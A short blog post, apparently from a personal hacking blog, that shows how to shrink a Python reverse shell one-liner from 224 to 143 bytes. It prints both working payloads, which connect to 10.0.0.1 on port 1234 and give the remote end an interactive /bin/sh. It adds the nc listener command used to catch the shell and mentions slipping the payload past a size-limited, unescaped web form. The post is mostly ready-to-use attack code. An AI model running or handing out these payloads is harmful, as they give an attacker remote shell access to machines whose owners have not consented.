---
layout: post
title:  "Compact Python Reverse Shell"
subtitle: "Making a compact python reverse shell, even more compact!"
categories: python hacking
published: true
comments: true
tags:
 - Python
 - Hacking
---

Inspired by an other python reverse shell found online.

The original version (224 bytes)

{% highlight python linenos %}
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

The much smaller new version (143 bytes)

{% highlight python linenos %}
	python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
{% endhighlight %}

To receive the reverse shell a simple nc works great.

{% highlight bash linenos %}
	nc -l -v -p 1234
{% endhighlight %}

All very simple, some work was done to reduce the size of it to help get it past a unescaped form that had a size limit.

